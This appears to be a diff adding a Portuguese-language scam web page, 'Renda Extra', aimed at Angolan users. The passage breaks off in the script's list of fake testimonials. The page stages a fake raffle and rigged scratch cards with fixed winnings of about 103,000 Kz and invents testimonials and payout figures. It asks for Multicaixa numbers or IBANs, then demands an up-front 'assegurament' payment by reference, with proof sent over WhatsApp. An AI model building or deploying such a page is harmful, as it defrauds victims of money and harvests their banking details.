@@ -1,0 +1,789 @@
+<!DOCTYPE html>
+<html lang="pt">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
+<title>Renda Extra</title>
+<link href="https://fonts.googleapis.com/css2?family=Bebas+Neue&family=Poppins:wght@400;600;700;900&display=swap" rel="stylesheet">
+<style>
+*{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent;}
+body{font-family:'Poppins',sans-serif;background:#0d0d0d;color:#fff;overscroll-behavior:none;}
+/* PAGES — controlled purely by JS style.display */
+.pag{display:none;width:100%;min-height:100vh;flex-direction:column;align-items:center;}
+/* SHARED */
+.fi{animation:fi .4s ease both;}
+@keyframes fi{from{opacity:0;transform:translateY(12px)}to{opacity:1;transform:none}}
+@keyframes gl{0%,100%{box-shadow:0 6px 22px rgba(255,165,0,.4)}50%{box-shadow:0 6px 40px rgba(255,165,0,.8)}}
+@keyframes ggl{0%,100%{box-shadow:0 6px 22px rgba(57,255,20,.4)}50%{box-shadow:0 6px 40px rgba(57,255,20,.8)}}
+@keyframes sp{to{transform:rotate(360deg)}}
+@keyframes cf{0%{opacity:1;transform:translateY(-10px) rotate(0)}100%{opacity:0;transform:translateY(110vh) rotate(540deg)}}
+@keyframes pp{0%,100%{box-shadow:0 0 0 0 rgba(255,215,0,.4)}50%{box-shadow:0 0 0 18px rgba(255,215,0,0)}}
+@keyframes ab{0%,100%{transform:translateX(-50%) translateY(0)}50%{transform:translateX(-50%) translateY(8px)}}
+/* ── LANDING ── */
+#p1{background:#0a0a0a;padding:2rem 1rem 3rem;gap:1.2rem;}
+.ltit{font-family:'Bebas Neue',sans-serif;font-size:clamp(1.6rem,5vw,2.2rem);letter-spacing:2px;text-align:center;line-height:1.2;background:linear-gradient(135deg,#FFD700,#FFA500);-webkit-background-clip:text;-webkit-text-fill-color:transparent;}
+.vbox{width:100%;max-width:380px;position:relative;border-radius:10px;overflow:hidden;background:#111;aspect-ratio:9/16;}
+.vph{position:absolute;inset:0;background:#161616;display:flex;flex-direction:column;align-items:center;justify-content:center;gap:.8rem;cursor:pointer;}
+.vpc{width:64px;height:64px;border-radius:50%;background:rgba(255,215,0,.15);border:2px solid rgba(255,215,0,.5);display:flex;align-items:center;justify-content:center;font-size:1.8rem;animation:pp 1.8s ease-in-out infinite;}
+.varr{position:absolute;bottom:80px;left:50%;transform:translateX(-50%);font-size:2.5rem;color:#e63946;animation:ab 1s ease-in-out infinite;pointer-events:none;z-index:5;}
+.vcap{position:absolute;bottom:0;left:0;right:0;background:linear-gradient(transparent,rgba(0,0,0,.85));padding:1.5rem .8rem .6rem;font-size:.8rem;color:rgba(255,255,255,.85);text-align:center;}
+.bpart{width:100%;max-width:380px;padding:16px;background:linear-gradient(135deg,#FFD700,#FFA500);border:none;border-radius:8px;cursor:pointer;font-family:'Bebas Neue',sans-serif;font-size:1.5rem;letter-spacing:3px;color:#000;transition:.2s;animation:gl 2s ease-in-out infinite;}
+.bpart:disabled{background:#2a2a2a;color:#555;animation:none;cursor:not-allowed;}
+.lcc{background:#161616;border:1px solid #222;border-radius:10px;padding:.7rem .9rem;display:flex;gap:.7rem;width:100%;max-width:380px;}
+.lav{width:36px;height:36px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:.85rem;font-weight:700;flex-shrink:0;}
+/* ── RENDA EXTRA ── */
+#p2{background:linear-gradient(180deg,#0d0d0d,#111);padding:1.5rem 1rem 2.5rem;gap:.9rem;}
+.plogo{font-family:'Poppins',sans-serif;font-size:clamp(1.8rem,7vw,2.8rem);font-weight:900;text-align:center;}
+.plogo .w{color:#fff;}.plogo .g{color:#39ff14;}
+.pticker{width:100%;max-width:460px;background:rgba(255,215,0,.08);border:1px solid rgba(255,215,0,.2);border-radius:8px;padding:.5rem 1rem;font-size:.78rem;color:#FFD700;text-align:center;font-weight:600;}
+.pbonus{width:100%;max-width:460px;background:linear-gradient(135deg,rgba(255,215,0,.08),rgba(255,165,0,.06));border:1.5px solid rgba(255,215,0,.25);border-radius:14px;padding:1.2rem;text-align:center;}
+.pbox{width:100%;max-width:460px;background:#161616;border:1px solid #252525;border-radius:14px;padding:1.3rem;}
+.pbox h3{font-size:1rem;font-weight:700;text-align:center;margin-bottom:1rem;}
+.pinp{width:100%;padding:13px 16px;background:#1e1e1e;border:1.5px solid #333;border-radius:10px;color:#fff;font-size:1rem;font-family:'Poppins',sans-serif;outline:none;margin-bottom:.9rem;}
+.pinp:focus{border-color:#FFD700;}.pinp::placeholder{color:#555;}
+.bg{width:100%;padding:15px;border:none;border-radius:12px;cursor:pointer;background:linear-gradient(135deg,#FFD700,#FFA500);font-family:'Bebas Neue',sans-serif;font-size:1.4rem;letter-spacing:2px;color:#000;}
+.bg:active{transform:scale(.97);}
+.pcmt{width:100%;max-width:460px;padding:.6rem 0;border-bottom:1px solid #1e1e1e;}
+.pcmt:last-child{border:none;}
+/* ── SORTEIO ── */
+#p3{background:#0d0d0d;justify-content:center;padding:2rem 1rem;gap:1.5rem;}
+.scard{background:#161616;border:2px solid rgba(255,215,0,.25);border-radius:20px;padding:2rem 1.5rem;width:min(400px,94vw);text-align:center;}
+.stit{font-family:'Bebas Neue',sans-serif;font-size:1.8rem;color:#FFD700;letter-spacing:3px;margin-bottom:.5rem;}
+.drum{background:#0d0d0d;border:2px solid #252525;border-radius:14px;padding:1.2rem;margin:1rem 0;}
+.ddisp{font-size:1.1rem;font-weight:700;height:2.5rem;display:flex;align-items:center;justify-content:center;}
+.dwin{font-family:'Bebas Neue',sans-serif;font-size:2rem;color:#39ff14;letter-spacing:2px;text-shadow:0 0 20px rgba(57,255,20,.5);display:none;}
+.spb{display:none;background:linear-gradient(135deg,rgba(57,255,20,.1),rgba(255,215,0,.08));border:1.5px solid rgba(57,255,20,.3);border-radius:12px;padding:1rem;margin-top:.8rem;}
+.spa{font-family:'Bebas Neue',sans-serif;font-size:2.5rem;color:#39ff14;}
+.spl{font-size:.82rem;color:#aaa;}
+.snxt{display:none;width:100%;padding:15px;background:linear-gradient(135deg,#39ff14,#18a80a);border:none;border-radius:50px;cursor:pointer;font-family:'Bebas Neue',sans-serif;font-size:1.5rem;letter-spacing:2px;color:#000;margin-top:.8rem;}
+/* ── ESCOLHA ── */
+#p4{background:#0a0a0a;padding:1.5rem 1rem 2rem;gap:1rem;}
+.etit{font-family:'Bebas Neue',sans-serif;font-size:1.8rem;color:#FFD700;letter-spacing:3px;text-align:center;}
+.ecards{display:flex;flex-direction:column;gap:.9rem;width:100%;max-width:460px;}
+.ecard{background:#161616;border:2px solid #252525;border-radius:18px;padding:1.3rem 1.4rem;}
+.ech{display:flex;align-items:center;justify-content:space-between;margin-bottom:.7rem;}
+.ecn{font-family:'Bebas Neue',sans-serif;font-size:1.4rem;letter-spacing:2px;}
+.ecn.m{color:#39ff14;}.ecn.b{color:#FFD700;}.ecn.s{color:#FF4500;}
+.ecp{font-size:.7rem;font-weight:700;padding:3px 10px;border-radius:20px;}
+.ecp.m{background:rgba(57,255,20,.15);color:#39ff14;border:1px solid rgba(57,255,20,.3);}
+.ecp.b{background:rgba(255,215,0,.15);color:#FFD700;border:1px solid rgba(255,215,0,.3);}
+.ecp.s{background:rgba(255,69,0,.15);color:#FF4500;border:1px solid rgba(255,69,0,.3);}
+.ecr{font-size:.82rem;color:#888;margin-bottom:.2rem;}.ecr strong{color:#ccc;}
+.ecret{font-size:.78rem;color:#666;margin:.3rem 0 .9rem;}
+/* THE GAME BUTTON — no parent onclick interference */
+.ecb{display:block;width:100%;padding:14px;border:none;border-radius:10px;cursor:pointer;font-family:'Bebas Neue',sans-serif;font-size:1.2rem;letter-spacing:1.5px;transition:.15s;}
+.ecb:active{transform:scale(.97);}
+.ecb.m{background:linear-gradient(135deg,#39ff14,#18a80a);color:#000;}
+.ecb.b{background:linear-gradient(135deg,#FFD700,#FFA500);color:#000;}
+.ecb.s{background:linear-gradient(135deg,#FF4500,#CC2800);color:#fff;}
+/* ── RASPADINHA ── */
+#p5{background:#0d0d0d;padding:0;}
+.rnav{width:100%;background:#0d0d0d;border-bottom:1px solid #1c1c1c;padding:.65rem 1.1rem;display:flex;align-items:center;justify-content:space-between;position:sticky;top:0;z-index:50;}
+.rnav-logo{font-family:'Poppins',sans-serif;font-size:1.1rem;font-weight:900;}
+.rnav-logo .w{color:#fff;}.rnav-logo .g{color:#39ff14;}
+.rnav-chip{background:#181818;border:1.5px solid #2a2a2a;border-radius:10px;padding:.28rem .85rem;text-align:center;}
+.rnav-chip .cl{font-size:.52rem;color:#888;font-weight:700;letter-spacing:1.5px;text-transform:uppercase;}
+.rnav-chip .cv{font-size:.95rem;font-weight:900;color:#FFD700;}
+.rbody{width:100%;max-width:500px;margin:0 auto;padding:.9rem 1rem 2rem;display:flex;flex-direction:column;align-items:center;gap:.85rem;}
+.ricon{font-size:2.6rem;text-align:center;}
+.rname{font-family:'Poppins',sans-serif;font-size:1.4rem;font-weight:900;color:#fff;text-align:center;}
+/* GRID */
+.sgrid{display:grid;grid-template-columns:repeat(3,1fr);gap:clamp(7px,2.2vw,12px);width:100%;max-width:360px;}
+.scell{position:relative;aspect-ratio:1;border-radius:14px;overflow:hidden;background:#1a1a1a;border:1.5px solid #252525;user-select:none;-webkit-user-select:none;}
+.scback{position:absolute;inset:0;z-index:1;display:flex;flex-direction:column;align-items:center;justify-content:center;border-radius:14px;}
+.scback.win{background:rgba(255,215,0,.07);}
+.scback.lose{background:#111;}
+.sem{font-size:clamp(1.3rem,5vw,2rem);line-height:1;}
+.sv{font-family:'Bebas Neue',sans-serif;font-size:clamp(.72rem,2.8vw,.9rem);letter-spacing:1px;margin-top:.2rem;}
+.sv.g{color:#FFD700;}.sv.r{color:#e63946;}
+.scell canvas{position:absolute;inset:0;z-index:2;width:100%;height:100%;display:block;border-radius:14px;cursor:crosshair;touch-action:none;transition:opacity .4s ease;}
+/* stats */
+.sbar{display:flex;gap:.55rem;width:100%;}
+.sbox{flex:1;background:#141414;border:1px solid #1e1e1e;border-radius:10px;padding:.5rem .3rem;text-align:center;}
+.slbl{font-size:.54rem;color:#555;text-transform:uppercase;letter-spacing:1px;}
+.sval{font-size:.88rem;font-weight:900;color:#FFD700;margin-top:.05rem;}
+.sval.gr{color:#39ff14;}
+.tick{width:100%;background:#111;border:1px solid #1e1e1e;border-radius:10px;padding:.45rem .8rem;text-align:center;font-size:.78rem;color:#FFD700;font-weight:700;min-height:2.1rem;display:flex;align-items:center;justify-content:center;}
+.blev{width:100%;padding:16px;border:none;border-radius:50px;background:#181818;color:#444;cursor:not-allowed;font-family:'Poppins',sans-serif;font-size:.95rem;font-weight:700;transition:.3s;}
+.blev.go{background:linear-gradient(135deg,#FFD700,#FF8C00);color:#000;cursor:pointer;font-family:'Bebas Neue',sans-serif;font-size:1.4rem;letter-spacing:2px;animation:gl 1.8s ease-in-out infinite;}
+/* ── LEVANTAR ── */
+#p6{background:linear-gradient(160deg,#060c06,#0d180d);padding:1.5rem 1rem 2rem;gap:1rem;}
+.lcard{background:rgba(0,0,0,.65);border:2px solid rgba(255,215,0,.25);border-radius:20px;padding:1.6rem;width:min(420px,94vw);text-align:center;}
+.lh{font-family:'Bebas Neue',sans-serif;font-size:1.6rem;color:#FFD700;letter-spacing:2px;}
+.ltot{font-family:'Bebas Neue',sans-serif;font-size:clamp(2.4rem,9vw,3.8rem);background:linear-gradient(135deg,#FFD700,#FF8C00);-webkit-background-clip:text;-webkit-text-fill-color:transparent;line-height:1.1;margin:.3rem 0 1rem;}
+.mrow{display:flex;gap:.8rem;margin-bottom:1rem;}
+.mb{flex:1;padding:14px 8px;background:#141414;border:2px solid #222;border-radius:14px;cursor:pointer;display:flex;flex-direction:column;align-items:center;gap:.4rem;font-size:.82rem;font-weight:600;color:#888;transition:.2s;}
+.mb.on{border-color:#FFD700;color:#FFD700;background:rgba(255,215,0,.06);}
+.ib{display:none;text-align:left;}
+.ib.show{display:block;}
+.ilbl{font-size:.75rem;color:#aaa;font-weight:700;margin-bottom:.35rem;}
+.iinp{width:100%;padding:13px 14px;background:rgba(255,255,255,.06);border:1.5px solid rgba(255,215,0,.2);border-radius:10px;color:#fff;font-size:1rem;font-family:'Poppins',sans-serif;outline:none;margin-bottom:.9rem;}
+.iinp:focus{border-color:#FFD700;}.iinp::placeholder{color:#444;}
+.bgr{width:100%;padding:15px;border:none;border-radius:12px;cursor:pointer;background:linear-gradient(135deg,#39ff14,#18a80a);font-family:'Bebas Neue',sans-serif;font-size:1.4rem;letter-spacing:2px;color:#000;}
+.bgr:active{transform:scale(.97);}
+/* ── VERIFICANDO ── */
+#p7{background:#0d0d0d;justify-content:center;gap:1.5rem;}
+.spin{width:80px;height:80px;border:5px solid #1e1e1e;border-top:5px solid #39ff14;border-radius:50%;animation:sp 1s linear infinite;}
+/* ── VIDEO ── */
+#p8{background:linear-gradient(160deg,#060c06,#0d180d);padding:1.5rem 1rem 2rem;gap:1rem;}
+.vcard{background:rgba(0,0,0,.65);border:2px solid rgba(255,215,0,.25);border-radius:20px;padding:1.5rem;width:min(420px,94vw);text-align:center;}
+.vcard h2{font-family:'Bebas Neue',sans-serif;font-size:1.5rem;color:#FFD700;letter-spacing:2px;margin-bottom:.4rem;}
+.vframe{width:100%;padding-top:56.25%;position:relative;border-radius:12px;overflow:hidden;background:#000;border:2px solid rgba(255,215,0,.2);margin:.7rem 0;}
+.vfph{position:absolute;inset:0;display:flex;flex-direction:column;align-items:center;justify-content:center;gap:.5rem;background:linear-gradient(135deg,#050f05,#0a180a);}
+.vplay{font-size:3.5rem;color:#39ff14;animation:pp 1.5s infinite;}
+.wbox{background:rgba(255,100,0,.08);border:1px solid rgba(255,100,0,.25);border-radius:12px;padding:.75rem 1rem;display:flex;align-items:flex-start;gap:.6rem;text-align:left;margin:.4rem 0;}
+.wt{font-size:.78rem;color:#FF8C00;line-height:1.5;}.wt strong{color:#FFD700;}
+.cdbar{width:100%;background:#111;border-radius:8px;height:8px;overflow:hidden;margin:.4rem 0;}
+.cdfil{height:100%;width:0%;background:linear-gradient(90deg,#39ff14,#FFD700);border-radius:8px;transition:width 1s linear;}
+.cdlbl{font-size:.75rem;color:#666;text-align:center;}.cdlbl strong{color:#39ff14;}
+.bpag{width:100%;padding:16px;border:none;border-radius:50px;cursor:pointer;background:linear-gradient(135deg,#39ff14,#18a80a);font-family:'Bebas Neue',sans-serif;font-size:1.45rem;letter-spacing:2px;color:#000;margin-top:.6rem;}
+.bpag:not(:disabled):active{transform:scale(.97);}
+.bpag:disabled{background:#1e1e1e;color:#444;cursor:not-allowed;}
+/* ── CHECKOUT ── */
+#p9{background:linear-gradient(160deg,#060c06,#0d180d);padding:1.5rem 1rem 2rem;gap:1rem;}
+.cocard{background:rgba(0,0,0,.65);border:1px solid rgba(255,255,255,.08);border-radius:20px;padding:1.5rem;width:min(440px,94vw);}
+.cocard h2{font-family:'Bebas Neue',sans-serif;font-size:1.5rem;color:#39ff14;letter-spacing:2px;text-align:center;margin-bottom:1rem;}
+.sr{display:flex;align-items:flex-start;gap:.75rem;padding:.55rem 0;border-bottom:1px solid rgba(255,255,255,.06);}
+.sr:last-of-type{border:none;}
+.sn{min-width:27px;height:27px;border-radius:50%;background:linear-gradient(135deg,#39ff14,#18a80a);color:#000;font-weight:900;font-size:.78rem;display:flex;align-items:center;justify-content:center;flex-shrink:0;}
+.st{font-size:.82rem;color:#aaa;line-height:1.5;}.st strong{color:#fff;}
+.rbx{background:rgba(57,255,20,.04);border:1.5px dashed rgba(57,255,20,.3);border-radius:12px;padding:1rem;text-align:center;margin:.75rem 0;}
+.rl{font-size:.65rem;color:#666;text-transform:uppercase;letter-spacing:1.5px;}
+.rv{font-family:'Bebas Neue',sans-serif;font-size:1.4rem;color:#39ff14;letter-spacing:3px;}
+.rph{font-size:.9rem;color:#fff;font-weight:700;margin-top:.2rem;}
+.sep{height:1px;background:rgba(255,255,255,.07);margin:.9rem 0;}
+.fl{font-size:.7rem;color:#39ff14;font-weight:700;text-transform:uppercase;letter-spacing:1px;margin-bottom:.3rem;display:block;}
+.fi2{width:100%;padding:12px 14px;margin-bottom:.75rem;background:rgba(255,255,255,.06);border:1.5px solid rgba(57,255,20,.18);border-radius:10px;color:#fff;font-size:.95rem;font-family:'Poppins',sans-serif;outline:none;}
+.fi2:focus{border-color:#39ff14;}.fi2[readonly]{opacity:.5;}
+.bwa{width:100%;padding:14px;border:none;border-radius:50px;cursor:pointer;background:linear-gradient(135deg,#25D366,#128C7E);font-family:'Bebas Neue',sans-serif;font-size:1.35rem;letter-spacing:2px;color:#fff;}
+.bwa:active{transform:scale(.97);}
+.cfp{position:fixed;pointer-events:none;z-index:9999;border-radius:2px;animation:cf linear forwards;}
+</style>
+</head>
+<body>
+
+<!-- P1 LANDING -->
+<div id="p1" class="pag" style="display:flex;">
+  <div class="ltit fi">GANHEM 100.000 KZ SEM<br>INVESTIR NADA NESSA<br>PLATAFORMA</div>
+  <div class="vbox" id="vbox">
+    <div class="vph" id="vph" onclick="playVid()">
+      <div class="vpc">▶</div>
+      <div style="font-size:.8rem;color:#aaa">Toque para assistir</div>
+    </div>
+    <div class="varr">↓</div>
+    <div class="vcap">abra com o seu telefone...</div>
+  </div>
+  <button class="bpart" id="bpart" disabled onclick="ir('p2')"><span id="btxt">AGUARDE <span id="bcd">30</span>s</span></button>
+  <div style="font-size:.82rem;color:#aaa;width:100%;max-width:380px;">Veja o que quem já participou tem a dizer!</div>
+  <div id="lcmts" style="width:100%;max-width:380px;display:flex;flex-direction:column;gap:.6rem;padding-bottom:1rem;"></div>
+</div>
+
+<!-- P2 RENDA EXTRA -->
+<div id="p2" class="pag">
+  <div style="text-align:center;padding-top:1.5rem" class="fi">
+    <div class="plogo"><span class="w">Renda</span><span class="g">Extra</span></div>
+    <div style="font-size:.78rem;color:#888;">A sua sorte está aqui</div>
+  </div>
+  <div class="pticker fi">🏆 Retrospectiva 2025 • 92.902.458,00 Kz pagos em prémios</div>
+  <div class="pbonus fi">
+    <div style="font-size:2rem;margin-bottom:.4rem">🏆</div>
+    <div style="font-size:.72rem;color:#FFD700;font-weight:700;letter-spacing:2px;text-transform:uppercase;">🎁 BÓNUS DE BOAS-VINDAS</div>
+    <div style="font-size:.85rem;color:#ccc;">Receba <strong style="color:#fff">5.000 Kz</strong> para começar!</div>
+  </div>
+  <div class="pbox fi">
+    <h3>Participe do Sorteio</h3>
+    <input class="pinp" type="text" id="pname" placeholder="Digite seu nome"/>
+    <button class="bg" onclick="doSorteio()">PARTICIPAR</button>
+  </div>
+  <div style="font-size:.9rem;font-weight:700;width:100%;max-width:460px;padding:0 .5rem;">Comentários Recentes</div>
+  <div id="pkcmts" style="width:100%;max-width:460px;padding:0 .5rem 2rem;"></div>
+</div>
+
+<!-- P3 SORTEIO -->
+<div id="p3" class="pag">
+  <div class="scard fi">
+    <div class="stit">🎰 SORTEIO AO VIVO</div>
+    <p style="color:#888;font-size:.82rem;">Selecionando o vencedor...</p>
+    <div class="drum">
+      <div class="ddisp" id="ddisp" style="color:#aaa">A sortear...</div>
+      <div class="dwin" id="dwin"></div>
+      <div id="dsub" style="font-size:.82rem;color:#888;margin-top:.3rem;"></div>
+    </div>
+    <div class="spb" id="spb">
+      <div style="font-size:.8rem;color:#aaa;margin-bottom:.3rem;">🎁 BÓNUS ATRIBUÍDO</div>
+      <div class="spa">5.000 Kz</div>
+      <div class="spl">adicionados ao seu saldo para jogar!</div>
+    </div>
+    <button class="snxt" id="snxt" onclick="ir('p4')">🎮 ESCOLHER JOGO</button>
+  </div>
+</div>
+
+<!-- P4 ESCOLHA -->
+<div id="p4" class="pag">
+  <div style="text-align:center;padding-top:1.5rem;margin-bottom:.5rem" class="fi">
+    <div class="etit">🎮 ESCOLHA O SEU JOGO</div>
+    <div style="font-size:.82rem;color:#aaa;">Quanto maior o investimento, maior o retorno!</div>
+    <div style="background:rgba(57,255,20,.1);border:1px solid rgba(57,255,20,.3);border-radius:20px;padding:.4rem 1.2rem;font-size:.85rem;color:#39ff14;font-weight:700;display:inline-block;margin-top:.6rem;">💰 Saldo: 5.000 Kz</div>
+  </div>
+  <div class="ecards" style="padding:.3rem 1rem 2rem;">
+
+    <div class="ecard">
+      <div class="ech"><span class="ecn m">🟢 MINI BAZA</span><span class="ecp m">BÁSICO</span></div>
+      <div class="ecr">Investimento: <strong>250 Kz</strong></div>
+      <div class="ecr">Saldo restante: <strong>4.750 Kz</strong></div>
+      <div class="ecret">🏆 Retorno estimado: <strong style="color:#39ff14">~103.000 Kz</strong></div>
+      <button class="ecb m" onclick="startJogo('mini',250)">▶ JOGAR MINI BAZA</button>
+    </div>
+
+    <div class="ecard">
+      <div class="ech"><span class="ecn b">🟡 BAZA</span><span class="ecp b">POPULAR</span></div>
+      <div class="ecr">Investimento: <strong>500 Kz</strong></div>
+      <div class="ecr">Saldo restante: <strong>4.500 Kz</strong></div>
+      <div class="ecret">🏆 Retorno estimado: <strong style="color:#FFD700">~103.000 Kz</strong></div>
+      <button class="ecb b" onclick="startJogo('baza',500)">▶ JOGAR BAZA</button>
+    </div>
+
+    <div class="ecard">
+      <div class="ech"><span class="ecn s">🔴 SUPER BAZA</span><span class="ecp s">PREMIUM</span></div>
+      <div class="ecr">Investimento: <strong>1.250 Kz</strong></div>
+      <div class="ecr">Saldo restante: <strong>3.750 Kz</strong></div>
+      <div class="ecret">🏆 Retorno estimado: <strong style="color:#FF4500">~103.000 Kz</strong></div>
+      <button class="ecb s" onclick="startJogo('super',1250)">▶ JOGAR SUPER BAZA</button>
+    </div>
+
+  </div>
+</div>
+
+<!-- P5 RASPADINHA -->
+<div id="p5" class="pag">
+  <div class="rnav">
+    <div class="rnav-logo"><span class="w">Renda</span><span class="g">Extra</span></div>
+    <div class="rnav-chip"><div class="cl">SALDO</div><div class="cv" id="rnSaldo">5.000 Kz</div></div>
+    <div style="font-size:.95rem;font-weight:900;color:#fff;"><span id="rnDone">00</span> →</div>
+  </div>
+  <div class="rbody">
+    <div class="ricon" id="rIcon">🎰</div>
+    <div class="rname" id="rName">Mini Baza</div>
+    <div style="font-size:.8rem;color:#888;text-align:center;">Raspe cada quadrado com o dedo ou rato para revelar o prémio!</div>
+    <div style="font-size:.74rem;color:#FFD700;text-align:center;">⚠ Raspe o quadrado até o prémio aparecer</div>
+    <div class="sgrid" id="sgrid"></div>
+    <div class="sbar">
+      <div class="sbox"><div class="slbl">💰 Ganhos</div><div class="sval" id="stTot">0 Kz</div></div>
+      <div class="sbox"><div class="slbl">🎯 Raspadas</div><div class="sval gr" id="stDone">0/10</div></div>
+      <div class="sbox"><div class="slbl">✅ Vitórias</div><div class="sval" id="stWins">0/10</div></div>
+    </div>
+    <div class="tick" id="tick">🎰 Raspe os quadrados para revelar os seus prémios!</div>
+    <button class="blev" id="blev" onclick="goLev()">💰 Complete todas as raspadinhas para levantar</button>
+  </div>
+</div>
+
+<!-- P6 LEVANTAR -->
+<div id="p6" class="pag">
+  <div style="text-align:center;padding-top:1.5rem" class="fi">
+    <div style="font-size:2.5rem">🏆</div>
+    <div style="font-family:'Bebas Neue',sans-serif;font-size:1.3rem;color:#39ff14;letter-spacing:3px;">RASPADINHA RENDA EXTRA</div>
+  </div>
+  <div class="lcard fi">
+    <div class="lh">💰 TOTAL GANHO</div>
+    <div class="ltot" id="ltot">103.450 Kz</div>
+    <p style="font-size:.82rem;color:#888;margin-bottom:.9rem;">Escolha como deseja receber:</p>
+    <div class="mrow">
+      <button class="mb" id="mbE" onclick="pickM('express')"><span style="font-size:1.5rem">📱</span><span>Multicaixa<br>Express</span></button>
+      <button class="mb" id="mbB" onclick="pickM('banco')"><span style="font-size:1.5rem">🏦</span><span>Transferência<br>Bancária</span></button>
+    </div>
+    <div class="ib" id="iE">
+      <div class="ilbl">📱 Número Multicaixa Express</div>
+      <input class="iinp" type="tel" id="inpE" placeholder="Ex: 923 456 789"/>
+    </div>
+    <div class="ib" id="iB">
+      <div class="ilbl">🏦 IBAN da Conta Bancária</div>
+      <input class="iinp" type="text" id="inpI" placeholder="Ex: AO06 0040 0000 0000 0000 1016 7"/>
+    </div>
+    <button class="bgr" onclick="doSacar()">💸 SACAR AGORA</button>
+  </div>
+</div>
+
+<!-- P7 VERIFICANDO -->
+<div id="p7" class="pag">
+  <div style="font-family:'Bebas Neue',sans-serif;font-size:2rem;color:#FFD700;letter-spacing:4px;" class="fi">🔍 VERIFICANDO</div>
+  <div class="spin fi" style="animation-delay:.15s"></div>
+  <div style="font-size:.85rem;color:#888;text-align:center;max-width:260px;line-height:1.6;" class="fi" style="animation-delay:.3s">Estamos a processar o seu pedido...<br><strong style="color:#FFD700">Por favor aguarde.</strong></div>
+</div>
+
+<!-- P8 VIDEO -->
+<div id="p8" class="pag">
+  <div style="text-align:center;padding-top:1.5rem" class="fi">
+    <div style="font-family:'Bebas Neue',sans-serif;font-size:1.3rem;color:#39ff14;letter-spacing:3px;">RASPADINHA RENDA EXTRA</div>
+    <div style="font-size:.65rem;color:#666;letter-spacing:2px;text-transform:uppercase;">Instruções de Levantamento</div>
+  </div>
+  <div class="vcard fi">
+    <h2>📹 Como Receber o Seu Dinheiro</h2>
+    <div class="vframe">
+      <div class="vfph">
+        <div class="vplay">▶</div>
+        <div style="font-weight:700;font-size:.9rem;color:#fff;">Vídeo de Instrução</div>
+        <div style="font-size:.75rem;color:#aaa;padding:0 1rem;text-align:center;">Assista para desbloquear o pagamento</div>
+      </div>
+    </div>
+    <div class="wbox">
+      <span style="font-size:1.2rem;flex-shrink:0;">⚠️</span>
+      <span class="wt">Deve assistir ao vídeo <strong>até ao fim</strong> para desbloquear o botão. Será liberado após <strong>3 minutos e 35 segundos</strong>.</span>
+    </div>
+    <div class="cdbar"><div class="cdfil" id="cdfil"></div></div>
+    <div class="cdlbl" id="cdlbl">Desbloqueio em: <strong id="cdtime">3:35</strong></div>
+    <button class="bpag" id="bpag" disabled onclick="ir('p9')">💳 PAGAR E RECEBER AGORA</button>
+  </div>
+</div>
+
+<!-- P9 CHECKOUT -->
+<div id="p9" class="pag">
+  <div style="text-align:center;padding-top:1rem" class="fi">
+    <div style="font-family:'Bebas Neue',sans-serif;font-size:1.3rem;color:#39ff14;letter-spacing:3px;">RASPADINHA RENDA EXTRA</div>
+    <div style="font-size:.65rem;color:#666;letter-spacing:2px;">PAGAMENTO DO ASSEGURAMENTO</div>
+  </div>
+  <div class="cocard fi">
+    <h2>📋 COMO PAGAR</h2>
+    <div class="sr"><div class="sn">1</div><div class="st">Abra o app bancário ou vá a um agente <strong>Multicaixa / ATM</strong></div></div>
+    <div class="sr"><div class="sn">2</div><div class="st">Selecione <strong>"Pagamento por Referência"</strong></div></div>
+    <div class="sr"><div class="sn">3</div><div class="st">Use a entidade e referência abaixo</div></div>
+    <div class="sr"><div class="sn">4</div><div class="st">Envie o comprovativo pelo <strong>WhatsApp</strong></div></div>
+    <div class="rbx">
+      <div class="rl">Entidade</div><div class="rv">99999</div>
+      <div style="height:1px;background:rgba(57,255,20,.12);margin:.5rem 0;"></div>
+      <div class="rl">Referência de Pagamento</div>
+      <div class="rv" id="coRef">--- --- ---</div>
+      <div style="height:1px;background:rgba(57,255,20,.12);margin:.5rem 0;"></div>
+      <div class="rl">WhatsApp</div>
+      <div class="rph">📱 +244 923 000 000</div>
+    </div>
+    <div class="sep"></div>
+    <label class="fl">👤 Nome Completo</label>
+    <input class="fi2" type="text" id="coName" placeholder="Nome completo"/>
+    <label class="fl">📱 Número de Telefone</label>
+    <input class="fi2" type="tel" id="coPhone" placeholder="923 000 000"/>
+    <label class="fl">🔢 Referência</label>
+    <input class="fi2" type="text" id="coRefInp" readonly/>
+    <label class="fl">📞 WhatsApp</label>
+    <input class="fi2" type="tel" value="+244 923 000 000" readonly/>
+    <button class="bwa" onclick="sendWA()">📲 ENVIAR COMPROVATIVO</button>
+    <p style="text-align:center;color:#333;font-size:.68rem;margin-top:.5rem;">Será redirecionado para o WhatsApp</p>
+  </div>
+</div>
+
+<script>
+// ─── NAVIGATE ───────────────────────────────────────
+function ir(id) {
+  var pages = ['p1','p2','p3','p4','p5','p6','p7','p8','p9'];
+  for (var i = 0; i < pages.length; i++) {
+    document.getElementById(pages[i]).style.display = 'none';
+  }
+  document.getElementById(id).style.display = 'flex';
+  window.scrollTo(0, 0);
+}
+
+// ─── STATE ──────────────────────────────────────────
+var G = {
+  name:'', type:'mini', invest:250, balance:5000,
+  done:0, wins:0, totalWon:0,
+  isWin:[], prizes:[], finalTotal:0
+};
+var REF = '1' + ('' + Math.floor(Math.random() * 99999999)).padStart(8, '0');
+var WSYM = ['💎','⭐','🍀','💰','🏆','🎯','🔔','🌟'];
+var LSYM = ['❌','💀','🚫','😞'];
+var PRIZE_LIST = [18500, 16200, 15800, 19300, 17100, 16550];
+
+// ─── LANDING COUNTDOWN ──────────────────────────────
+var secs = 30;
+var tmr = setInterval(function() {
+  secs--;
+  if (secs > 0) {
+    document.getElementById('bcd').textContent = secs;
+  } else {
+    clearInterval(tmr);
+    var b = document.getElementById('bpart');
+    b.disabled = false;
+    document.getElementById('btxt').textContent = 'PARTICIPAR';
+  }
+}, 1000);
+
+// Landing comments
+var LC = [
+  {n:'Maria K.',c:'#e63946',t:'Há 2h',l:198,tx:'Ganhei sem investir nada 🎉 fiz o saque e caiu na hora.'},
+  {n:'João K.',c:'#4361ee',t:'Há 6h',l:86,tx:'Testei e deu certo mesmo. Recomendo!'},
+  {n:'Ana P.',c:'#2ec4b6',t:'Há 14h',l:104,tx:'Não acreditei mas funciona. Ganhei sem investir nada 🙌'},
